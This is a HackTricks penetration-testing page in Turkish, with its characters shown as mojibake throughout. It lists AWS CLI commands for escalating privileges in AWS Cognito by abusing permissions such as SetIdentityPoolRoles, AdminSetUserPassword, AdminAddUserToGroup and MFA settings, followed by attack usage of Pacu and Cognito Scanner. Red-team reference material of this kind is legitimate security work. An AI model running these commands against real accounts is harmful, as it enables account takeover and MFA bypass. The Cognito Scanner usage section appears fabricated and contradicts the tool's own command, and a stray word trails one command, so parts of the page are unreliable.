# AWS - Cognito Yetkilendirme YÃ¼kseltme

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'i **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Cognito

Cognito hakkÄ±nda daha fazla bilgi iÃ§in:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Kimlik Havuzundan Kimlik Bilgileri Toplama

Cognito, **kimlik doÄŸrulama yapÄ±lmÄ±ÅŸ** ve **kimlik doÄŸrulama yapÄ±lmamÄ±ÅŸ** **kullanÄ±cÄ±lara IAM rol kimlik bilgileri** verebildiÄŸi iÃ§in, bir uygulamanÄ±n **Kimlik Havuzu KimliÄŸi**'ni (bu genellikle uygulamada sabitlenmiÅŸtir) bulursanÄ±z, yeni kimlik bilgilerini elde edebilir ve dolayÄ±sÄ±yla yetkilendirme yÃ¼kseltme yapabilirsiniz (muhtemelen daha Ã¶nce hiÃ§bir kimlik bilginizin olmadÄ±ÄŸÄ± bir AWS hesabÄ±nda).

Daha fazla bilgi iÃ§in [**bu sayfayÄ± kontrol edin**](../aws-unauthenticated-enum-access/#cognito).

**Potansiyel Etki:** Kimlik doÄŸrulama yapÄ±lmamÄ±ÅŸ kullanÄ±cÄ±lara baÄŸlÄ± hizmetler rolÃ¼ne doÄŸrudan yetkilendirme yÃ¼kseltme (ve muhtemelen kimlik doÄŸrulama yapÄ±lmÄ±ÅŸ kullanÄ±cÄ±lara baÄŸlÄ± olanÄ±na da). 

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Bu izinle, cognito uygulamasÄ±nÄ±n kimlik doÄŸrulama yapÄ±lmÄ±ÅŸ/kimlik doÄŸrulama yapÄ±lmamÄ±ÅŸ kullanÄ±cÄ±larÄ±na **herhangi bir cognito rolÃ¼** verebilirsiniz.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
EÄŸer cognito uygulamasÄ±nda **kimliÄŸi doÄŸrulanmamÄ±ÅŸ kullanÄ±cÄ±lar etkinleÅŸtirilmemiÅŸse**, bunu etkinleÅŸtirmek iÃ§in `cognito-identity:UpdateIdentityPool` iznine de ihtiyacÄ±nÄ±z olabilir.

**Potansiyel Etki:** Herhangi bir cognito rolÃ¼ne doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme.

### `cognito-identity:update-identity-pool`

Bu izne sahip bir saldÄ±rgan, Ã¶rneÄŸin kendi kontrolÃ¼ altÄ±ndaki bir Cognito KullanÄ±cÄ± Havuzu veya giriÅŸ yapabileceÄŸi baÅŸka bir kimlik saÄŸlayÄ±cÄ±yÄ± ayarlayabilir ve bÃ¶ylece bu Cognito Kimlik Havuzuna **eriÅŸim saÄŸlama yolunu** elde edebilir. ArdÄ±ndan, sadece o kullanÄ±cÄ± saÄŸlayÄ±cÄ±ya **giriÅŸ yapmak**, yapÄ±landÄ±rÄ±lmÄ±ÅŸ kimlik havuzundaki doÄŸrulanmÄ±ÅŸ rolÃ¼ne **eriÅŸimine izin verecektir**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Bu izni kÃ¶tÃ¼ye kullanarak temel yetkilendirmeyi etkinleÅŸtirmek de mÃ¼mkÃ¼ndÃ¼r:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potansiyel Etki**: Kimlik havuzundaki yapÄ±landÄ±rÄ±lmÄ±ÅŸ yetkilendirilmiÅŸ IAM rolÃ¼nÃ¼ tehlikeye atar.

### `cognito-idp:AdminAddUserToGroup`

Bu izin, bir Cognito kullanÄ±cÄ±sÄ±nÄ± Cognito grubuna eklemeye izin verir, bu nedenle bir saldÄ±rgan bu izni kÃ¶tÃ¼ye kullanarak kontrolÃ¼ altÄ±ndaki bir kullanÄ±cÄ±yÄ± daha iyi ayrÄ±calÄ±klara veya farklÄ± IAM rollerine sahip diÄŸer gruplara ekleyebilir:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potansiyel Etki:** DiÄŸer Cognito gruplarÄ±na ve KullanÄ±cÄ± Havuzu GruplarÄ±na baÄŸlÄ± IAM rollerine ayrÄ±calÄ±k yÃ¼kseltme.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Bu izinlere sahip bir saldÄ±rgan, **kompromize edilmiÅŸ bir Cognito Kimlik SaÄŸlayÄ±cÄ±sÄ± tarafÄ±ndan kullanÄ±labilecek her IAM rolÃ¼yle gruplarÄ± oluÅŸturabilir/gÃ¼ncelleyebilir** ve kompromize edilmiÅŸ bir kullanÄ±cÄ±yÄ± gruba dahil ederek tÃ¼m bu rolleri eriÅŸebilir:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potansiyel Etki:** DiÄŸer Cognito IAM rollerine ayrÄ±calÄ±k yÃ¼kseltme.

### `cognito-idp:AdminConfirmSignUp`

Bu izin, bir kaydÄ± **doÄŸrulamaya** izin verir. VarsayÄ±lan olarak, herhangi biri Cognito uygulamalarÄ±na giriÅŸ yapabilir, eÄŸer bu izin bÄ±rakÄ±lÄ±rsa, bir kullanÄ±cÄ± herhangi bir veriyle bir hesap oluÅŸturabilir ve bunu bu izinle doÄŸrulayabilir.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potansiyel Etki:** Yeni bir kullanÄ±cÄ± kaydedebilirseniz, kimlik havuzu IAM rolÃ¼nde kimlik doÄŸrulama yapmÄ±ÅŸ kullanÄ±cÄ±lara dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltme yapabilirsiniz. Herhangi bir hesabÄ± onaylayabilme yeteneÄŸiyle diÄŸer uygulama iÅŸlevlerine dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltme yapabilirsiniz.

### `cognito-idp:AdminCreateUser`

Bu izin, saldÄ±rganÄ±n kullanÄ±cÄ± havuzunda yeni bir kullanÄ±cÄ± oluÅŸturmasÄ±na izin verir. Yeni kullanÄ±cÄ± etkin olarak oluÅŸturulur, ancak ÅŸifresini deÄŸiÅŸtirmesi gerekecektir.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potansiyel Etki:** Kimlik havuzu IAM rolÃ¼nde doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme. Herhangi bir kullanÄ±cÄ± oluÅŸturabilme yeteneÄŸi ile diÄŸer uygulama iÅŸlevlerine dolaylÄ± ayrÄ±calÄ±k yÃ¼kseltme.

### `cognito-idp:AdminEnableUser`

Bu izinler, bir saldÄ±rganÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ bir kullanÄ±cÄ±nÄ±n kimlik bilgilerini bulduÄŸu ve tekrar etkinleÅŸtirmesi gerektiÄŸi Ã§ok nadir bir senaryoda yardÄ±mcÄ± olabilir.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potansiyel Etki:** YetkilendirilmiÅŸ kullanÄ±cÄ±lar iÃ§in kimlik havuzu IAM rolÃ¼ne dolaylÄ± olarak ayrÄ±calÄ±k yÃ¼kseltme ve saldÄ±rganÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ bir kullanÄ±cÄ±nÄ±n kimlik bilgilerine sahip olmasÄ± durumunda kullanÄ±cÄ±nÄ±n izinlerine eriÅŸme.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Bu izin, [**ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)** yÃ¶ntemiyle giriÅŸ yapmaya izin verir**. Daha fazla bilgi iÃ§in baÄŸlantÄ±yÄ± takip edin.

### `cognito-idp:AdminSetUserPassword`

Bu izin, bir saldÄ±rganÄ±n **herhangi bir kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirmesine** olanak tanÄ±r, bÃ¶ylece herhangi bir kullanÄ±cÄ±nÄ±n yerine geÃ§ebilir (MFA etkin olmayan kullanÄ±cÄ±lar iÃ§in).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potansiyel Etki:** Potansiyel olarak herhangi bir kullanÄ±cÄ±ya doÄŸrudan ayrÄ±calÄ±k kazanma, her kullanÄ±cÄ±nÄ±n Ã¼ye olduÄŸu tÃ¼m gruplara eriÅŸim ve Kimlik Havuzu kimlik doÄŸrulama IAM rolÃ¼ne eriÅŸim.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Bir saldÄ±rgan, bu izni kullanarak bir kullanÄ±cÄ±nÄ±n **SMS MFA'sÄ± olarak kontrolÃ¼ altÄ±ndaki bir mobil telefonu ayarlayabilir**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Ã–ncekiyle benzer ÅŸekilde, bu izin kullanÄ±cÄ±larÄ±n MFA tercihlerini ayarlamak iÃ§in kullanÄ±labilir ve MFA korumasÄ±nÄ± atlamak iÃ§in kullanÄ±labilir.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Ã–ncekiyle benzer ÅŸekilde, bu izin kullanÄ±cÄ± havuzunun MFA tercihlerini ayarlamak iÃ§in kullanÄ±labilir ve MFA korumasÄ±nÄ± atlamak iÃ§in kullanÄ±labilir.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** KullanÄ±cÄ± havuzunu gÃ¼ncelleyerek MFA politikasÄ±nÄ± deÄŸiÅŸtirmek mÃ¼mkÃ¼ndÃ¼r. [Buradan cli'yi kontrol edin](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potansiyel Etki:** SaldÄ±rganÄ±n kimlik bilgilerini bildiÄŸi herhangi bir kullanÄ±cÄ±ya dolaylÄ± olarak yetki yÃ¼kseltme yapabilmesi, MFA korumasÄ±nÄ± atlamasÄ±na izin verebilir.

### `cognito-idp:AdminUpdateUserAttributes`

Bu izne sahip bir saldÄ±rgan, kontrolÃ¼ altÄ±ndaki bir kullanÄ±cÄ±nÄ±n e-posta veya telefon numarasÄ±nÄ± veya baÅŸka bir Ã¶zniteliÄŸini deÄŸiÅŸtirerek altta yatan bir uygulamada daha fazla ayrÄ±calÄ±k elde etmeye Ã§alÄ±ÅŸabilir.\
Bu, bir e-posta veya telefon numarasÄ±nÄ± deÄŸiÅŸtirip doÄŸrulanmÄ±ÅŸ olarak ayarlamayÄ± saÄŸlar.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potansiyel Etki:** KullanÄ±cÄ± Ã¶zniteliklerine dayalÄ± yetkilere sahip olan Cognito KullanÄ±cÄ± Havuzu kullanarak, altta yatan uygulamada potansiyel dolaylÄ± yetki yÃ¼kseltme.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Bu izne sahip bir saldÄ±rgan, zaten mevcut havuz istemcilerinden daha az kÄ±sÄ±tlamalÄ± bir **yeni bir KullanÄ±cÄ± Havuzu Ä°stemcisi oluÅŸturabilir**. Ã–rneÄŸin, yeni istemci herhangi bir kimlik doÄŸrulama yÃ¶ntemine izin verebilir, herhangi bir gizli anahtara sahip olmayabilir, belirteÃ§ iptalini devre dÄ±ÅŸÄ± bÄ±rakabilir, belirteÃ§lerin daha uzun sÃ¼re geÃ§erli olmasÄ±na izin verebilir...

AynÄ± ÅŸey, **mevcut bir istemcinin deÄŸiÅŸtirilmesi** durumunda da yapÄ±labilir.

[**Komut satÄ±rÄ±nda**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (veya [**gÃ¼ncelleme komutunda**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) tÃ¼m seÃ§enekleri gÃ¶rebilirsiniz, kontrol edin!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potansiyel Etki:** KullanÄ±cÄ± Havuzu tarafÄ±ndan kullanÄ±lan Kimlik Havuzu yetkilendirilmiÅŸ kullanÄ±cÄ±sÄ±na dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltme potansiyeli, gÃ¼venlik Ã¶nlemlerini gevÅŸeten ve saldÄ±rganÄ±n oluÅŸturabildiÄŸi bir kullanÄ±cÄ±yla giriÅŸ yapmasÄ±na olanak tanÄ±yan yeni bir istemci oluÅŸturarak.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Bir saldÄ±rgan, bu izni kÃ¶tÃ¼ye kullanarak yeni kullanÄ±cÄ±larÄ± iÃ§eren bir CSV yÃ¼kleyerek kullanÄ±cÄ±lar oluÅŸturabilir.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(EÄŸer yeni bir iÃ§e aktarma iÅŸlemi oluÅŸturursanÄ±z, henÃ¼z test etmedim ama iam passrole iznine ihtiyacÄ±nÄ±z olabilir).

**Potansiyel Etki:** Kimlik havuzu IAM rolÃ¼ne doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme. Herhangi bir kullanÄ±cÄ± oluÅŸturabilme yeteneÄŸiyle diÄŸer uygulama iÅŸlevlerine dolaylÄ± ayrÄ±calÄ±k yÃ¼kseltme.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

SaldÄ±rgan, yeni bir kimlik saÄŸlayÄ±cÄ± oluÅŸturarak **bu saÄŸlayÄ±cÄ± aracÄ±lÄ±ÄŸÄ±yla giriÅŸ yapabilir**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potansiyel Etki:** Kimlik havuzu IAM rolÃ¼nde doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme. Herhangi bir kullanÄ±cÄ± oluÅŸturabilme yeteneÄŸiyle dolaylÄ± olarak diÄŸer uygulama iÅŸlevlerine ayrÄ±calÄ±k yÃ¼kseltme.

### cognito-sync:\* Analizi

Bu, Cognito Kimlik HavuzlarÄ±nÄ±n rollerinde varsayÄ±lan olarak Ã§ok yaygÄ±n bir izindir. Ä°zinlerdeki joker karakter her zaman kÃ¶tÃ¼ gÃ¶rÃ¼nse de (Ã¶zellikle AWS'den geliyorsa), **saldÄ±rgan perspektifinden verilen izinler Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir**.

Bu izin, Kimlik HavuzlarÄ±nÄ±n ve Kimlik HavuzlarÄ± iÃ§indeki Kimlik Kimliklerinin kullanÄ±cÄ± bilgilerini okumaya izin verir (bu hassas bilgi deÄŸildir).\
Kimlik Kimlikleri, kendilerine atanan [**Veri Setlerini**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API_Dataset.html) iÃ§erebilir, bunlar oturumlarÄ±n bilgileridir (AWS bunu bir **kaydedilmiÅŸ oyun** gibi tanÄ±mlar). Bu verilerin bazÄ± hassas bilgiler iÃ§ermesi mÃ¼mkÃ¼ndÃ¼r (ancak olasÄ±lÄ±k oldukÃ§a dÃ¼ÅŸÃ¼ktÃ¼r). Bu bilgilere nasÄ±l eriÅŸileceÄŸini [**enumarasyon sayfasÄ±nda**](../aws-services/aws-cognito-enum/) bulabilirsiniz.

Bir saldÄ±rgan, bu izinleri ayrÄ±ca bu veri setlerindeki deÄŸiÅŸiklikleri yayÄ±nlayan bir Cognito akÄ±ÅŸÄ±na **kendini kaydedebilir veya cognito olaylarÄ± Ã¼zerinde tetiklenen bir lambda** kullanabilir. Bunu kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmedim ve burada hassas bilgi beklemem, ancak imkansÄ±z deÄŸil.

### Otomatik AraÃ§lar

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS istismar Ã§erÃ§evesi, artÄ±k bir hesaptaki tÃ¼m Cognito varlÄ±klarÄ±nÄ±n enumarasyonunu otomatikleÅŸtiren "cognito\_\_enum" ve "cognito\_\_attack" modÃ¼llerini iÃ§erir ve zayÄ±f yapÄ±landÄ±rmalarÄ±, eriÅŸim kontrolÃ¼ iÃ§in kullanÄ±lan kullanÄ±cÄ± Ã¶zniteliklerini vb. belirler ve deÄŸiÅŸtirilebilir Ã¶zel Ã¶zniteliklere dayalÄ± kullanÄ±cÄ± oluÅŸturmayÄ± (MFA desteÄŸi de dahil olmak Ã¼zere) ve deÄŸiÅŸtirilebilir kimlik havuzu kimlik bilgilerini, kimlik belirteÃ§lerindeki kabul edilebilir rolleri otomatikleÅŸtirir.

ModÃ¼llerin iÅŸlevlerinin aÃ§Ä±klamasÄ± iÃ§in [blog yazÄ±sÄ±nÄ±n](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) ikinci bÃ¶lÃ¼mÃ¼ne bakÄ±n. Kurulum talimatlarÄ± iÃ§in ana [Pacu](https://github.com/RhinoSecurityLabs/pacu) sayfasÄ±na bakÄ±n.

#### KullanÄ±m

Belirli bir kimlik havuzu ve kullanÄ±cÄ± havuzu istemcisi iÃ§in kullanÄ±cÄ± oluÅŸturma ve tÃ¼m ayrÄ±calÄ±k yÃ¼kseltme vektÃ¶rlerini denemek iÃ§in Ã¶rnek cognito\_\_attack kullanÄ±mÄ±:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Mevcut AWS hesabÄ±nda gÃ¶rÃ¼nen tÃ¼m kullanÄ±cÄ± havuzlarÄ±, kullanÄ±cÄ± havuzu istemcileri, kimlik havuzlarÄ±, kullanÄ±cÄ±lar vb. bilgileri toplamak iÃ§in kullanÄ±lan Ã¶rnek cognito\_\_enum kullanÄ±mÄ±:

```plaintext
cognito__enum
```

Bu komut, AWS hesabÄ±nda bulunan tÃ¼m kullanÄ±cÄ± havuzlarÄ±nÄ±, kullanÄ±cÄ± havuzu istemcilerini, kimlik havuzlarÄ±nÄ±, kullanÄ±cÄ±larÄ± vb. listeleyecektir.
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner), Cognito Ã¼zerinde farklÄ± saldÄ±rÄ±larÄ±, bir privilage escalation (ayrÄ±calÄ±k yÃ¼kseltme) dahil olmak Ã¼zere uygulayan Python tabanlÄ± bir CLI aracÄ±dÄ±r.

#### Kurulum
```bash
$ pip install cognito-scanner
```
#### KullanÄ±m

```plaintext
python3 aws_cognito_privesc.py <access_key> <secret_key> <user_pool_id> <region>
```

#### AÃ§Ä±klama

Bu araÃ§, AWS Cognito hizmetinde ayrÄ±calÄ±k yÃ¼kseltme saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lÄ±r. SaldÄ±rganÄ±n, hedef kullanÄ±cÄ±nÄ±n kimlik bilgilerine (eriÅŸim anahtarÄ± ve gizli anahtar) ve hedef kullanÄ±cÄ± havuzunun kimlik bilgilerine (kullanÄ±cÄ± havuzu kimlik bilgisi ve bÃ¶lge) eriÅŸimi olmalÄ±dÄ±r.

#### Ã–rnek

```plaintext
python3 aws_cognito_privesc.py ABCDEFGHIJKLMNOPQRST 1234567890abcdefghijklmnopqrstuvwxyz1234 us-west-2
```

Bu Ã¶rnekte, saldÄ±rganÄ±n eriÅŸim anahtarÄ± "ABCDEFGHIJKLMNOPQRST" ve gizli anahtarÄ± "1234567890abcdefghijklmnopqrstuvwxyz1234" olarak kabul edilir. Hedef kullanÄ±cÄ± havuzu kimlik bilgisi "us-west-2" bÃ¶lgesinde bulunan bir kullanÄ±cÄ± havuzunu temsil eder.
```bash
$ cognito-scanner --help
```
Daha fazla bilgi iÃ§in [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner) adresini kontrol edin.

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin.**
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
